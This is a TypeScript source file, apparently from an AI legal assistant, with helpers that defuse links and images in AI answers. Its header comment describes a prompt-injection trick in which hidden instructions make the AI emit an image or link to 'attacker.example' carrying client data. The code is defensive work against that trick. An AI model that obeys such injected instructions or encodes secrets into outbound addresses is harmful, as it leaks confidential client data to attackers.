// Addresses that come from AI answers (or from documents the AI quotes).
//
// A document or web page can carry hidden instructions ("prompt injection").
// One trick is to make the AI write an image or a link whose address carries
// client data: https://attacker.example/?d=<secret>. An image would load by
// itself, without a click. So answers never load anything from an address:
// images become a plain "[image: host]" link, and every link needs a click
// (with a question first when the address looks like it carries data).

/** The host of an address ("" when it has none or cannot be read). */
export function hostOf(url: string): string {
  try {
    const h = new URL(String(url), 'http://invalid.local/').host
    return h === 'invalid.local' ? '' : h
  } catch {
    return ''
  }
}

/** An address a click may open in the browser: http(s) and mailto only. */
export function safeHref(url: string | undefined | null): string | null {
  const s = String(url || '').trim()
  if (!s) return null
  let u: URL
  try { u = new URL(s) } catch { return null }
  if (u.protocol === 'http:' || u.protocol === 'https:' || u.protocol === 'mailto:') return u.href
  return null
}

/**
 * Should the lawyer confirm before the address opens? Yes when it could
 * carry data out: a query or fragment, a long path, placeholders
 * ([[PARTY_1]]), long encoded runs, or e-mail links with a body.
 */
export function linkNeedsConfirm(url: string): boolean {
  let u: URL
  try { u = new URL(String(url)) } catch { return true }
  if (u.protocol === 'mailto:') return /[?&](body|cc|bcc)=/i.test(u.search) || u.href.length > 120
  if (u.username || u.password) return true
  if (u.search.length > 1 || u.hash.length > 1) return true
  const raw = decodeSafe(u.pathname)
  if (raw.length > 100) return true
  if (/\[\[|%5B%5B/i.test(u.href)) return true
  // A long run of letters/digits (base64, hex) in one path segment looks like data.
  if (/[A-Za-z0-9+_=-]{32,}/.test(raw)) return true
  return false
}

function decodeSafe(s: string): string {
  try { return decodeURIComponent(s) } catch { return s }
}
